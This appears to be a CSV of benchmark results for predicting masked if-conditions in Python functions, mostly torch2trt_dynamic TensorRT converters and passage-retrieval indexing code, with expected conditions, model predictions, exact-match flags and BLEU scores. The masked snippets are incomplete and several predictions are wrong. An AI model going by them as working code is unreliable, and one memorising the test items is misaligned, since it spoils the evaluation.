input_function,expected_condition,predicted_condition,exact_match,bleu_score
"@tensorrt_converter('torch.nn.LayerNorm.forward') def convert_LayerNorm(ctx): module = ctx.method_args[0] input = ctx.method_args[1] normalized_shape = module.normalized_shape weight = module.weight bias = module.bias eps = module.eps output = ctx.method_return eps_np = np.array([eps], dtype=np.float32) keep_dims = True input_trt = trt_(ctx.network, input) if: input_shape_trt = tensor_trt_get_shape_trt(ctx.network, input_trt) new_input_shape_trt = ctx.network.add_concatenation([trt_(ctx.network, 1), input_shape_trt]).get_output(0) layer = ctx.network.add_shuffle(input_trt) layer.set_input(1, new_input_shape_trt) input_trt = layer.get_output(0) reduce_axes = torch_dim_to_trt_axes(tuple(range(len(input_trt.shape) - len(normalized_shape), len(input_trt.shape)))) mean_trt = ctx.network.add_reduce(input_trt, trt.ReduceOperation.AVG, reduce_axes, keep_dims).get_output(0) delta_trt = ctx.network.add_elementwise(input_trt, mean_trt, trt.ElementWiseOperation.SUB).get_output(0) var_trt = ctx.network.add_scale(delta_trt, trt.ScaleMode.UNIFORM, np.zeros_like(eps_np), np.ones_like(eps_np), 2 * np.ones_like(eps_np)).get_output(0) var_trt = ctx.network.add_reduce(var_trt, trt.ReduceOperation.AVG, reduce_axes, keep_dims).get_output(0) var_trt = ctx.network.add_scale(var_trt, trt.ScaleMode.UNIFORM, eps_np, np.ones_like(eps_np), 0.5 * np.ones",len(input.shape) == 3,"isinstance(input_trt, torch.Tensor)",0.0,9.980099403873663
"@tensorrt_converter('torch.cumprod') @tensorrt_converter('torch.Tensor.cumprod') def convert_cumprod(ctx): old_args = ctx.method_args old_kwargs = ctx.method_kwargs input = ctx.method_args[0] dim = get_arg(ctx, 'dim', pos=1, default=0) cum_type = 1 if: dim = len(input.shape) + dim output = ctx.method_return if input.dtype == torch.bool or input.dtype == bool: cast_input = input.type_as(output) ctx.method_args = [input] ctx.method_kwargs = {} ctx.method_return = cast_input convert_type(ctx, torch_dtype_to_trt(output.dtype)) input_trt = trt_(ctx.network, cast_input) else: input_trt = trt_(ctx.network, input) plugin = create_torchcum_plugin('cumprod_' + str(id(input)), dim=dim, cum_type=cum_type) custom_layer = ctx.network.add_plugin_v2(inputs=[input_trt], plugin=plugin) output_trt = custom_layer.get_output(0) if input.dtype != output.dtype: tmp_output = output.clone() tmp_output._trt = output_trt ctx.method_args = [tmp_output] ctx.method_kwargs = {} ctx.method_return = output convert_type(ctx, torch_dtype_to_trt(output.dtype)) output_trt = ctx.method_return._trt output._trt = output_trt ctx.method_args = old_args ctx.method_kwargs = old_kwargs ctx.method_return = output",dim < 0,dim < 0,1.0,0.0
"def _reshape_1d2d3d(network, x_trt): x_shape_trt = network.add_shape(x_trt).get_output(0) y_trt = x_trt ndim = len(x_trt.shape) if: one_trt = trt_(network, 1) new_x_shape_trt = network.add_concatenation([x_shape_trt] + [one_trt] * (4 - ndim)).get_output(0) if ndim > 4: head_shape_trt = network.add_slice(x_shape_trt, [0], [3], [1]).get_output(0) tail_shape_trt = network.add_slice(x_shape_trt, [3], [1], [1]).get_output(0) for i in range(4, ndim): other_trt = network.add_slice(x_shape_trt, [i], [1], [1]).get_output(0) tail_shape_trt = network.add_elementwise(tail_shape_trt, other_trt, trt.ElementWiseOperation.PROD).get_output(0) new_x_shape_trt = network.add_concatenation([head_shape_trt, tail_shape_trt]).get_output(0) if ndim != 4: layer = network.add_shuffle(x_trt) layer.set_input(1, new_x_shape_trt) y_trt = layer.get_output(0) return (y_trt, x_shape_trt)",ndim < 4,ndim < 4,1.0,0.0
"def forward(self, x): align_corners = None if: align_corners = True return torch.nn.functional.interpolate(x, size=self.size, scale_factor=self.scale_factor, mode=self.mode, align_corners=align_corners)",self.mode != 'nearest',self.align_corners,0.0,17.491650626361256
"@tensorrt_converter('torch.nn.functional.max_pool2d') def convert_max_pool2d(ctx): input = get_arg(ctx, 'input', pos=0, default=None) kernel_size = get_arg(ctx, 'kernel_size', pos=1, default=None) stride = get_arg(ctx, 'stride', pos=2, default=None) padding = get_arg(ctx, 'padding', pos=3, default=0) ceil_mode = get_arg(ctx, 'ceil_mode', pos=5, default=False) input_trt = trt_(ctx.network, input) output = ctx.method_return if: kernel_size = (kernel_size,) * 2 if not isinstance(stride, tuple): stride = (stride,) * 2 if not isinstance(padding, tuple): padding = (padding,) * 2 layer = ctx.network.add_pooling_nd(input=input_trt, type=trt.PoolingType.MAX, window_size=kernel_size) layer.stride_nd = stride layer.padding_nd = padding if ceil_mode: layer.padding_mode = trt.PaddingMode.EXPLICIT_ROUND_UP output._trt = layer.get_output(0)","not isinstance(kernel_size, tuple)","not isinstance(kernel_size, tuple)",1.0,100.00000000000004
"@tensorrt_converter('torch.ones') def convert_ones(ctx): size = ctx.method_args[0] if: size = ctx.method_args dtype = torch.float32 if 'dtype' in ctx.method_kwargs: dtype = ctx.method_kwargs['dtype'] output = ctx.method_return if isinstance(size, int): size = (size,) is_const = True for s in size: if hasattr(s, '_trt'): is_const = False break if is_const: output_trt = trt_(ctx.network, output) else: trt_size = [] for s in size: if hasattr(s, '_trt'): trt_size.append(s._trt) else: trt_size.append(trt_(ctx.network, s)) trt_size = ctx.network.add_concatenation(trt_size).get_output(0) layer = ctx.network.add_fill(size, trt.FillOperation.RANDOM_UNIFORM) layer.set_input(0, trt_size) layer.set_input(1, trt_(ctx.network, torch.tensor(1.0, dtype=dtype).cuda())) layer.set_input(2, trt_(ctx.network, torch.tensor(1.0, dtype=dtype).cuda())) output_trt = layer.get_output(0) data_type = None if dtype == torch.float32: data_type = trt.DataType.FLOAT elif dtype == torch.int32 or dtype == torch.long: data_type = trt.DataType.INT32 elif dtype == torch.bool: data_type = trt.DataType.BOOL else: print('unsupported convert type:{}'.format(dtype)) if data_type is not None: layer = ctx.network.add_identity(output_trt) layer.set_output_type(0, data_type) output_trt = layer.get_output(0) output._trt = output_trt","not isinstance(size, Iterable)","not isinstance(size, list)",0.0,64.34588841607616
"def get_intwarper_trt(other, ctx): if: return other._trt elif isinstance(other, int): return ctx.network.add_constant((1,), np.array([other], dtype=np.int32)).get_output(0) else: return other","isinstance(other, IntWarper)","hasattr(other, '_trt')",0.0,22.089591134157878
"@tensorrt_converter('torch2trt_dynamic.converters.size.IntWarper.__rsub__') def convert_intwarper_rsub(ctx): self = ctx.method_args[0] other = ctx.method_args[1] output = ctx.method_return trt_other = get_intwarper_trt(other, ctx) if: trt_value = ctx.network.add_elementwise(trt_other, self._trt, trt.ElementWiseOperation.SUB).get_output(0) ret = IntWarper(output) ret._trt = trt_value ctx.method_return = ret","isinstance(trt_other, trt.ITensor)","isinstance(trt_other, trt.ITensor)",1.0,100.00000000000004
"@tensorrt_converter('torch2trt_dynamic.converters.size.IntWarper.__rfloordiv__') def convert_intwarper_rfloordiv(ctx): self = ctx.method_args[0] other = ctx.method_args[1] output = ctx.method_return trt_other = get_intwarper_trt(other, ctx) if: trt_value = ctx.network.add_elementwise(trt_other, self._trt, trt.ElementWiseOperation.FLOOR_DIV).get_output(0) ret = IntWarper(output) ret._trt = trt_value ctx.method_return = ret","isinstance(trt_other, trt.ITensor)","isinstance(trt_other, trt.ITensor)",1.0,100.00000000000004
"@tensorrt_converter('torch.std') @tensorrt_converter('torch.Tensor.std') def convert_std(ctx): old_method_args = ctx.method_args old_method_kwargs = ctx.method_kwargs input = ctx.method_args[0] input_trt = trt_(ctx.network, input) output = ctx.method_return dim = get_arg(ctx, 'dim', pos=1, default=None) unbiased = get_arg(ctx, 'unbiased', pos=2, default=True) keepdim = get_arg(ctx, 'keepdim', pos=3, default=False) if: mean_val = input.mean(dim, True) ctx.method_args = [input, dim, True] ctx.method_kwargs = [] ctx.method_return = mean_val convert_mean(ctx) else: mean_val = input.mean() ctx.method_args = [input, None, False] ctx.method_kwargs = [] ctx.method_return = mean_val convert_mean(ctx) x_minus_mean = input - mean_val ctx.method_args = [input, mean_val] ctx.method_return = x_minus_mean convert_sub(ctx) x_pow = x_minus_mean * x_minus_mean ctx.method_args = [x_minus_mean, x_minus_mean] ctx.method_return = x_pow convert_mul(ctx) x_pow_trt = trt_(ctx.network, x_pow) if dim is None: dim = tuple(range(len(input.shape))) if isinstance(dim, list): dim = tuple(dim) if not isinstance(dim, tuple): dim = (dim,) dim = tuple([d if d >= 0 else len(input.shape) + d for d in dim]) axes = 0 for d in dim: axes |= 1 << d if unbiased: layer = ctx.network.add_reduce(x_pow_trt, trt.ReduceOperation.SUM, axes, keepdim) sum_trt = layer.get_output(0) shape_trt = tensor_trt_get_shape_trt(ctx.network, input_trt, dim[0],",dim is not None,dim is not None,1.0,100.00000000000004
"@tensorrt_converter('torch.Tensor.t') def convert_t(ctx): input = ctx.method_args[0] input_trt = trt_(ctx.network, input) output = ctx.method_return if: layer = ctx.network.add_identity(input_trt) output._trt = layer.get_output(0) else: ctx.method_args = [input, 1, 0] ctx.method_kwargs = {} convert_transpose(ctx)",len(input.shape) == 1,"isinstance(input_trt, torch.Tensor)",0.0,9.980099403873663
def trt_num_outputs(engine): count = 0 for i in range(engine.num_bindings): if: count += 1 return count,not engine.binding_is_input(i),engine.bindings[i] is not None and engine.outputs[i] is not None,0.0,5.0912128230977505
"def __bind_inputs(signature: inspect.Signature): nonlocal args, kwargs if: args = list() if kwargs is None: kwargs = dict() return signature.bind(*args, **kwargs).arguments",args is None,args is None,1.0,0.0
"def __init__(self, path=None, data=None): self.path = path if: assert isinstance(data, dict), type(data) self._load_data(data) or self._load_file(path)",data,data is not None,0.0,15.97357760615681
"def load_topK_pids(topK_path, qrels): topK_pids = defaultdict(list) topK_positives = defaultdict(list) print_message('#> Loading the top-k PIDs per query from', topK_path, '...') with open(topK_path) as f: for line_idx, line in enumerate(f): if line_idx and line_idx % (10 * 1000 * 1000) == 0: print(line_idx, end=' ', flush=True) qid, pid, *rest = line.strip().split('\t') qid, pid = (int(qid), int(pid)) topK_pids[qid].append(pid) assert len(rest) in [1, 2, 3] if len(rest) > 1: *_, label = rest label = int(label) assert label in [0, 1] if label >= 1: topK_positives[qid].append(pid) print() assert all((len(topK_pids[qid]) == len(set(topK_pids[qid])) for qid in topK_pids)) assert all((len(topK_positives[qid]) == len(set(topK_positives[qid])) for qid in topK_positives)) topK_positives = {qid: set(topK_positives[qid]) for qid in topK_positives} Ks = [len(topK_pids[qid]) for qid in topK_pids] print_message('#> max(Ks) =', max(Ks), ', avg(Ks) =', round(sum(Ks) / len(Ks), 2)) print_message('#> Loaded the top-k per query for', len(topK_pids), 'unique queries.\n') if: topK_positives = None else: assert len(topK_pids) >= len(topK_positives) for qid in set.difference(set(topK_pids.keys()), set(topK_positives.keys())): topK_positives[qid] = [] assert len(topK_pids) == len(",len(topK_positives) == 0,len(topK_pids) == 0,0.0,59.694917920196445
"def __init__(self, config, searcher, checkpoint=None): self.config = config self.searcher = searcher self.index_path = searcher.index self.has_checkpoint = False if: self.has_checkpoint = True self.checkpoint = Checkpoint(checkpoint, config) self.encoder = CollectionEncoder(config, self.checkpoint) self._load_disk_ivf() self.removed_pids = [] self.first_new_emb = torch.sum(self.searcher.ranker.doclens).item() self.first_new_pid = len(self.searcher.ranker.doclens)",checkpoint,checkpoint is not None,0.0,15.97357760615681
"def _get_chunk_idx(self, pid): for i in range(self.metadata['num_chunks']): chunk_metadata = self._load_chunk_metadata(i) if: return i raise ValueError('Passage ID out of range')",chunk_metadata['passage_offset'] <= pid and chunk_metadata['passage_offset'] + chunk_metadata['num_passages'] > pid,chunk_metadata['passage_id'] == pid,0.0,8.681327204190175
